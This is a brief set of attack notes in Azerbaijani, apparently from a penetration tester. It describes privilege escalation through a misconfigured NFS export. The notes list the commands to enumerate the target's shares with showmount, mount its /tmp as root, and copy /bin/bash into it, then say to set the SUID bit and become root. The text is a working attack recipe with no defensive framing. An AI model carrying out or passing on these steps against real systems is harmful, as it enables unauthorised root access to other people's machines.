## ILK OLARAQ BIZ HEDEFIN NFS KIMI ICAZELERINE BAXIRIQ 
    showmount -e {ip adress}
## EGER ICAZELERI VARSA (MESELEN TMP QOVLUQU) ONDA
## oz mashinimizda root ile share qovluqu yaradiriq
     sudo mount  -t nfs ("ip adress"):/tmp /tmp/share
## ve hedefin tmp qovluqlarinda olan hershey bizde gorsenecek ve ilk olaraq /bin/bash qovluqunu 
     cp /bin/bash .
##  kopyalayib getiririk ve atack masinimizda buna suid icazesi verib kecirk roota     
